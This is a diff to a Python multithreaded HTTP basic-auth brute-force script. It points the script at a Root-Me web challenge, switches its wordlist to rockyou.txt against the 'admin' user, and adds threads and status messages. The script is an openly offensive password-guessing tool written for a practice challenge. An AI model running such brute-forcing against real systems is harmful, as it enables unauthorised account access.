@@ -1,4 +1,5 @@
 from requests import get
+import requests
 from base64 import b64encode
 import sys
 import os
@@ -9,15 +10,15 @@ import time
 
 class Environnement():
     def __init__(self, tries):
-        self.URL = 'http://192.168.43.32'
+        self.URL = 'http://challenge01.root-me.org/web-serveur/ch3/' #'http://192.168.1.28'#
         self.USER = 'admin'
-        self.PATH = "test.txt"  # Path of password list
+        self.PATH = "rockyou.txt"  # Path of password list
         self.TMP_PATH = "./tmp/"  # Created during the runtime -> store the files for each Thread
         self.FAILS, self.ERROR = 0, 0
         self.FLAG = ''
-        self.TRIES = tries  # Password number to check : WARNING -> percentage not accurate if to big
+        self.TRIES = tries  # Password number to check : WARNING -> percentage not accurate if too big
         self.FOUND = False
-        self.THREAD_NUMBER = 4 # Warning too much thread can be more slower (the computer need to manage them so his capacities are used)
+        self.THREAD_NUMBER = 8 # Warning too much thread can be more slower (the computer need to manage them so his capacities are used)
         self.FILES_PATHS = []  # Each thread has his file
         self.ATTEMPT = 0
         self.THREAD_PERCENTAGE = None
@@ -26,12 +27,14 @@ class Environnement():
         
 
 # Init our environnement
-env = Environnement(16737)
+env = Environnement(100000)
 
 class InfoThread(threading.Thread):
     def __init__(self):
         threading.Thread.__init__(self)
     def run(self):
+        connected = False
+        searching_info_given = False
         last_percentage = 0
         current_percentage = self.get_percentage()
         while current_percentage<101 or env.FOUND!=True:
@@ -39,6 +42,12 @@ class InfoThread(threading.Thread):
             if last_percentage != current_percentage and current_percentage<101:
                 print(f"[INFO] {current_percentage} %")
                 last_percentage=current_percentage
+            if env.FAILS > 1 and not connected:
+                connected = True
+                print('[INFO] Connected.')
+            elif env.FAILS < 1 and not connected and not searching_info_given:
+                print('[INFO] Search connection...')
+                searching_info_given = True
             time.sleep(0.001)
     def get_percentage(self):
         return int(float(env.ATTEMPT)*100 / float(env.TRIES))
@@ -48,8 +57,8 @@ class BruteForceThread(threading.Thread):
         threading.Thread.__init__(self)
         self.path = path
     def run(self):  # path is the file path for the thread using this function. Brute Force basic auth function.
-        print('\n\n   [+] STARTING \'%s\'\n\n' % (env.URL))
-        print(self.path+"\n")
+        # print('\n\n   [+] STARTING \'%s\'\n\n' % (env.URL))
+        # print(self.path+"\n")
         with open(self.path, 'r') as f:
             for i in range(int(env.TRIES/env.THREAD_NUMBER)):
                 if env.FOUND == False:
@@ -67,6 +76,8 @@ class BruteForceThread(threading.Thread):
                             break
                         env.FAILS += 1
                         time.sleep(0.001)
+                    except requests.exceptions.ConnectionError as e:
+                        print('[WARNING] Connection Pool Error')
                     except Exception as e:  # Catch problem
                         print('[ERROR] SOMETHING WENT WRONG')
                         env.ERROR += 1
@@ -125,7 +136,6 @@ if __name__ == '__main__':
     for i in range(env.THREAD_NUMBER):
         thread =  BruteForceThread(f"{env.TMP_PATH}{i}.txt")
         jobs.append(thread)
-    print(jobs)
     try:
         # Start the threads (i.e. brute force with each password list)
         for j in jobs:
